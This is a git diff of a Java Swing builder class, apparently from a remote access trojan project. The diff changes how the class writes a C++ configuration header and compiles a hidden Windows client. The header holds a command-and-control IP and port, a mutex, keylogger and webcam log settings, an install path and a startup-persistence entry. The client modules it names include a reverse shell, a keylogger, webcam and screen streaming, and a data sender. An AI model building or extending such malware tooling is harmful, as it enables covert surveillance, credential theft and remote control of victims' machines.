@@ -6,6 +6,7 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
 import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 
 import java.nio.file.Path;
@@ -27,101 +28,75 @@ public class Compiler implements ActionListener {
         this.checkBoxes = checkBoxesArray;
         this.fieldsArray = fieldsArray;
         this.buttonGroup = buttonGroup;
+        assemblyPath = Path.of(localClientFiles.toString() ,"compile_configuration");
+
+    }
 
 
+
+
+    public void generateConfigurationFile(CompileInformation compileInformation) {
+        String pragmaOnce = "#pragma once\n";
+        String IP = pragmaOnce + "#define IP \"" + compileInformation.IP() + "\"\n";
+        String PORT = "#define PORT " + compileInformation.PORT() + "\n";
+        String TAG_NAME = "#define TAG_NAME \"" + compileInformation.TAG_name() + "\"\n";
+        String MUTEX = "#define MUTEX \"" + compileInformation.MUTEX() + "\"\n";
+        String TIMING_RETRY = "#define TIMING_RETRY " + compileInformation.TIMING_RETRY() + "\n";
+        String WEBCAM = "#define WEBCAM \"" + compileInformation.WEBCAM_LOGS() + "\"\n";
+        String KEYLOGGER = "#define KEYLOGGER_DEF \"" + compileInformation.KEYLOGGER_LOGS() + "\"\n";
+        String INSTALL_PATH = "#define INSTALL_PATH " + compileInformation.INSTALL_PATH() + "\n";
+        String SUBDIRECTORY_NAME = "#define SUBDIRECTORY_NAME \"" + compileInformation.SUBDIRECTORY_NAME() + "\"\n";
+        String SUBDIRECTORY_FILE_NAME = "#define SUBDIRECTORY_FILE_NAME \"" + compileInformation.SUBDIRECTORY_FILE_NAME() + "\"\n";
+        String STARTUP_NAME = "#define STARTUP_NAME \"" + compileInformation.STARTUP_NAME() + "\"\n";
+
+        String configurationContent = pragmaOnce + IP + PORT + TAG_NAME + MUTEX + TIMING_RETRY + WEBCAM +
+                KEYLOGGER + INSTALL_PATH + SUBDIRECTORY_NAME +
+                SUBDIRECTORY_FILE_NAME + STARTUP_NAME;
+
+        Path path = Path.of(localClientFiles.toString(), "includes\\configuration.h");
+        try (FileWriter fileWriter = new FileWriter(path.toFile())) {
+            fileWriter.write(configurationContent);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     // Creating command line for compiling with g++, several options to include on the client
     @Override
     public void actionPerformed(ActionEvent e) {
-        assemblyPath = Path.of(localClientFiles.toString(), "compile_configuration");
         // File chooser where to save file
-        final StringBuilder command = new StringBuilder();
         JFileChooser chooser = new JFileChooser();
         chooser.setFileFilter(new FileNameExtensionFilter(".exe", "."));
         chooser.setCurrentDirectory(new File(System.getProperty("user.dir")));
         chooser.setSelectedFile(new File("client"));
         chooser.setAcceptAllFileFilterUsed(false);
         int returnVal = chooser.showSaveDialog(compilerDialog);
-        CPPModifier modifier = new CPPModifier(Path.of(localClientFiles.toString(), "configuration.h").toString());
         if (returnVal == JFileChooser.APPROVE_OPTION) {
             setAssemblySettings();
             // Set IP
-            modifier.variableModifier("IP", "\"" + fieldsArray[0].getText() + "\"");
-            // Set PORT
-            modifier.variableModifier("PORT", fieldsArray[1].getText());
-            // Set tag name
-            modifier.variableModifier("TAG_NAME", "\"" + fieldsArray[2].getText() + "\"");
-            // Set mutex
-            modifier.variableModifier("MUTEX", "\"" + fieldsArray[3].getText() + "\"");
-            // Set timing
-            modifier.variableModifier("TIMING_RETRY", fieldsArray[4].getText());
+            String IP = fieldsArray[0].getText();
+            int PORT = Integer.parseInt(fieldsArray[1].getText());
+            String TAG_name = fieldsArray[2].getText();
+            String MUTEX = fieldsArray[3].getText();
+            int TIMING_RETRY = Integer.parseInt(fieldsArray[4].getText());
+            String WEBCAM_LOGS = fieldsArray[9].getText(); // Assuming this is the correct field
+            String KEYLOGGER_LOGS = fieldsArray[10].getText(); // Assuming this is the correct field
+            String INSTALL_PATH = checkBoxes[0].isSelected() ? buttonGroup.getSelection().getActionCommand() : "-1";
+            String SUBDIRECTORY_NAME = fieldsArray[6].getText();
+            String SUBDIRECTORY_FILE_NAME = fieldsArray[7].getText() + ".exe";
+            String STARTUP_NAME = checkBoxes[1].isSelected() ? fieldsArray[8].getText() : "";
+
+            CompileInformation compileInformation = new CompileInformation(IP, PORT, TAG_name, MUTEX, TIMING_RETRY, WEBCAM_LOGS, KEYLOGGER_LOGS,
+                    Integer.parseInt(INSTALL_PATH), SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
+
+            generateConfigurationFile(compileInformation);
+
             // Create command line
             String utilities = fieldsArray[5].getText();
             String pathOfUtilities = "";
             if (!utilities.equals("g++ / windres")) pathOfUtilities = utilities;
             String assemblyCommand = Path.of(pathOfUtilities, "windres") + " assembly.rc compiled_assembly.opc";
-            command.append(Path.of(pathOfUtilities, "g++")).append(" compile_configuration/compiled_assembly.opc client.cpp " +
-                    "video_audio/DeviceEnumerator.cpp " +
-                    "stream/Stream.cpp  " +
-                    "time/Utils.Time.cpp  converter/Converter.cpp " +
-                    "download/Download.cpp " +
-                    "file/FileManager.cpp  " +
-                    "information/system/Information.SystemInformation.cpp  " +
-                    "information/network/Information.NetworkInformation.cpp " +
-                    "reverse_shell/ReverseShell.cpp " +
-                    "keyboard/KeyboardExecuter.cpp " +
-                    "permission/Permission.cpp " +
-                    "box_message/MessageBoxGUI.cpp " +
-                    "state/SystemState.cpp " +
-                    "install/Install.cpp " +
-                    "sender/Sender.cpp ");
-            // check if installation needs to be make
-            if (checkBoxes[0].isSelected()) {
-                modifier.variableModifier("INSTALL_PATH", buttonGroup.getSelection().getActionCommand());
-                modifier.variableModifier("SUBDIRECTORY_NAME", "\"" + fieldsArray[6].getText() + "\"");
-                modifier.variableModifier("SUBDIRECTORY_FILE_NAME", "\"" + fieldsArray[7].getText() + ".exe" + "\"");
-                modifier.variableModifier("STARTUP_NAME", checkBoxes[1].isSelected() ? "\"" + fieldsArray[8].getText() + "\"" : "\"\"");
-            } else {
-                modifier.variableModifier("INSTALL_PATH", "(-1)");
-            }
-            if (checkBoxes[3].isSelected()) {
-                modifier.addInclude("#define KEYLOGGER");
-                modifier.variableModifier("KEYLOGGER", "\"" + fieldsArray[10].getText() + "\"");
-                command.append("keylogger/KeyLogger.cpp ");
-            } else modifier.removeInclude("#define KEYLOGGER");
-            if (checkBoxes[2].isSelected()) {
-                modifier.addInclude("#define WEBCAM");
-                modifier.variableModifier("WEBCAM", "\"" + fieldsArray[9].getText() + "\"");
-                System.out.println("selected webcam");
-                command.append(
-                        "screen/ScreenStreamer.cpp " +
-                                "webcam/WebcamManager.cpp " +
-                                " -IC:opencv_static/include -Lopencv_static/lib " +
-                                "-lopencv_gapi460 -lopencv_highgui460 " +
-                                "-lopencv_ml460 -lopencv_objdetect460 " +
-                                "-lopencv_photo460 -lopencv_stitching460 " +
-                                "-lopencv_video460 -lopencv_calib3d460 " +
-                                "-lopencv_features2d460 -lopencv_dnn460 " +
-                                "-lopencv_flann460 -lopencv_videoio460 " +
-                                "-lopencv_imgcodecs460 -lopencv_imgproc460 " +
-                                "-lopencv_core460 -llibprotobuf " +
-                                "-lade -llibjpeg-turbo -llibwebp " +
-                                "-llibpng -llibtiff -llibopenjp2 -lIlmImf " +
-                                "-lzlib -lquirc ");
-            } else modifier.removeInclude("#define WEBCAM");
-            command.append("-lwsock32 -lcomctl32 -lgdi32 " +
-                            "-lole32 -lsetupapi -lws2_32  -loleaut32 -luuid" +
-                            " -lcomdlg32 -lwininet -static-libgcc " +
-                            "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -mwindows -o ")
-                    .append("\"")
-                    .append(chooser.getSelectedFile().getAbsolutePath())
-                    .append("\"");
-
-
-            modifier.writeToFile();
-            System.out.println(command);
-            compile(command.toString(), assemblyCommand);
+            compile("mingw32-make", assemblyCommand);
         }
 
     }
